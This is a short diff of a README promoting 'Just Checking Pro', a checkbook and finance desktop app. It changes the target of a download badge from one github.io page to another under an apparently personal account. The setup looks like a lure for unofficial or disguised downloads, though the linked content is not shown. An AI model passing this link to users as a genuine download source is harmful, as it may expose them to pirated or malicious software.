@@ -3,7 +3,7 @@
 Stay in control of your personal finances with **Just Checking Pro** — a straightforward desktop app for managing checkbooks, reconciling transactions, and tracking account balances from home.
 
 ⬇️ **Download**  
-[![Download Just Checking Pro](https://img.shields.io/badge/Download-Just_Checking_Pro-blue?style=for-the-badge&logo=windows&logoColor=white)](https://just-checking-free-for-pc.github.io/.github/)
+[![Download Just Checking Pro](https://img.shields.io/badge/Download-Just_Checking_Pro-blue?style=for-the-badge&logo=windows&logoColor=white)](https://kviktoriya805.github.io/.github/just-checking-for-pc)
 
 ---
 
